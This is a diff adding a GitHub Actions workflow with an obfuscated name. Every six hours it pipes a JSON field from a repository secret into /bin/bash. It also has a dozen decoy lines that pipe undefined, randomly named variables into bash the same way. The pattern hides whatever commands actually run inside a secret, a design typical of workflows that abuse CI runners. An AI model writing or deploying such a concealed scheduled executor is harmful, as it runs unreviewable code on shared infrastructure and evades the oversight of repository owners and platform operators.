@@ -1,0 +1,28 @@
+name: smartabortive
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '34 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: smartabortive
+        env:
+          nwtp11: ${{ secrets.nwtp11 }}
+        run: |
+          echo $nwtp11 | jq -r .ntg807 | /bin/bash
+          echo $fp1969 | jq -r .emoa782 | /bin/bash
+          echo $fifpo5716 | jq -r .leotj5776 | /bin/bash
+          echo $t94 | jq -r .j476 | /bin/bash
+          echo $kr1125 | jq -r .aw83338 | /bin/bash
+          echo $vmj393 | jq -r .cnbmc6 | /bin/bash
+          echo $yhkx12 | jq -r .tgmu18272 | /bin/bash
+          echo $m1 | jq -r .kq0 | /bin/bash
+          echo $gv04 | jq -r .belu30 | /bin/bash
+          echo $ikp0774 | jq -r .uun3 | /bin/bash
+          echo $kgxot44180 | jq -r .q51 | /bin/bash
+          echo $xean886 | jq -r .iyt983 | /bin/bash
+          echo $pm36717 | jq -r .wzjv756 | /bin/bash
+
